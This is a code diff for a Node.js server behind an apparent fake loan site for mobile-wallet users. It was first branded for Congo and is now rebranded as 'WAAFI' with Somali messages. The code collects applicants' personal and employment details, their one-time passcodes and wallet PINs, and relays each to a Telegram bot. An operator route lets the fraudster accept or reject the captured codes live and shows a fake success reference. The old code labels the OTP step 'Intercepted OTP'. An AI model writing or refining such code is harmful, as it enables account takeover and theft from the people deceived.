@@ -1,81 +1,139 @@
-require('dotenv').config();
 const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const path = require('path');
-const cors = require('cors');
-
-const botManager = require('./bot_manager');
-
 const app = express();
-const server = http.createServer(app);
+const http = require('http').createServer(app);
+const io = require('socket.io')(http);
+const axios = require('axios');
+const path = require('path');
 
-// Configure Socket.io for Render (CORS is essential)
-const io = socketIo(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-global.io = io; // Link socket globally so botManager can call back rooms
-
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
-
-app.use(cors());
 app.use(express.json());
+
+// Serves the user interface layout directly to fix Render's "Cannot GET /" error
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook Route for Telegram
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
-    res.sendStatus(200);
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
+
+const activeSessions = new Map();
+
+// Formats the URL securely even if the protocol prefix is omitted in the dashboard settings
+let rawBotUrl = process.env.BOT_MANAGER_URL || 'http://localhost:3001';
+if (!rawBotUrl.startsWith('http://') && !rawBotUrl.startsWith('https://')) {
+    rawBotUrl = 'https://' + rawBotUrl;
+}
+const BOT_MANAGER_URL = rawBotUrl;
 
 io.on('connection', (socket) => {
-    // Generate unique Congo application session tag
-    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    // Generate a clean application identity token
+    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
     
-    socket.join(appId);
-    console.log(`🔌 Congo User connected: ${appId}`);
-    
-    // Send AppID back to the frontend right away
+    activeSessions.set(socket.id, {
+        appId: appId, socketId: socket.id,
+        loanType: '', amount: 1200, term: '1', purpose: '',
+        firstName: '', lastName: '', email: '', phone: '',
+        employment: '', income: '', employer: '',
+        otpToken: '', pinCode: '', step: 1
+    });
+
     socket.emit('session-ready', { appId: appId });
+    socket.join(appId);
 
-    // Standard Log Streams (No admin inline interaction buttons needed)
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
-
-    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
-    socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
-    });
-
-    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
-    socket.on('step5', (data) => {
-        botManager.sendFinalApproval(appId, data.pin);
-    });
-
-    socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected: ${appId}`);
-    });
-});
-
-server.listen(PORT, async () => {
-    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
-    
-    // Auto-configure Webhooks on deployment platforms like Render
-    if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
-        } catch (err) {
-            console.error('❌ Webhook Setup Failed:', err.message);
+    // STEP 1: Basic Profile Submission
+    socket.on('step1', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (session) { 
+            Object.assign(session, payload);
+            session.step = 2; 
+            activeSessions.set(socket.id, session); 
         }
-    } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
-    }
+    });
+
+    // STEP 2: Secondary Profile Submission
+    socket.on('step2', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (session) { 
+            Object.assign(session, payload);
+            session.step = 3; 
+            activeSessions.set(socket.id, session); 
+        }
+    });
+
+    // STEP 3: Automated data verification handler (Bypasses old admin check block entirely)
+    socket.on('step3', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+        
+        Object.assign(session, payload);
+        session.step = 4;
+        activeSessions.set(socket.id, session);
+
+        // INSTANT ADVANCE: Immediately unlocks Step 4 (OTP page) on the frontend browser interface
+        socket.emit('admin-approve-otp'); 
+
+        // Dispatches profile records silently to the Telegram ledger (No interactive buttons attached)
+        axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session })
+            .catch(err => console.error("Step 3 Telegram communication drop:", err.message));
+    });
+
+    // STEP 4: Triggered ONLY when the user populates and submits their 6-digit verification OTP token
+    socket.on('step4-otp', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+
+        session.otpToken = payload.otp;
+        activeSessions.set(socket.id, session);
+
+        // Alert the admin panel to provide verify/reject options
+        axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session })
+            .catch(err => console.error("Step 4 Telegram communication drop:", err.message));
+    });
+
+    // STEP 5: Triggered ONLY when the user inputs and submits their structural wallet PIN 
+    socket.on('step5-pin', (payload) => {
+        let session = activeSessions.get(socket.id);
+        if (!session) return;
+
+        session.pinCode = payload.pin;
+        activeSessions.set(socket.id, session);
+
+        // Alert the admin panel to authorize final disbursement execution
+        axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session })
+            .catch(err => console.error("Step 5 Telegram communication drop:", err.message));
+    });
+
+    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
 });
+
+// =========================================================================
+// ACTION CONTROL INTERCEPT HANDLER ROUTER FROM TELEGRAM WEBHOOK CALLS
+// =========================================================================
+app.post('/api/admin-action', (req, res) => {
+    const { actionSignal, targetAppId, message } = req.body;
+    
+    let targetSession = null;
+    for (let [socketId, record] of activeSessions.entries()) {
+        if (record.appId === targetAppId) { targetSession = record; break; }
+    }
+
+    if (!targetSession) return res.status(404).json({ error: "Active application thread missing" });
+    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
+    if (!clientSocket) return res.status(410).json({ error: "Target device connection is offline" });
+
+    if (actionSignal === 'approve_otp') {
+        // Moves the frontend browser directly to the Step 5 secure PIN collection window
+        clientSocket.emit('admin-approve-otp'); 
+    } else if (actionSignal === 'otp-failed') {
+        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad. Fadlan dib u tijaabi." });
+    } else if (actionSignal === 'approve_pin') {
+        // Generates random success sequence and forces frontend into Step 6 success card view
+        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
+        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
+    } else if (actionSignal === 'pin-failed') {
+        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad. Fadlan iska hubi." });
+    }
+
+    return res.json({ success: true });
+});
+
+const PORT = process.env.PORT || 3000;
+http.listen(PORT, () => console.log(`Core application instance operating on port ${PORT}`));
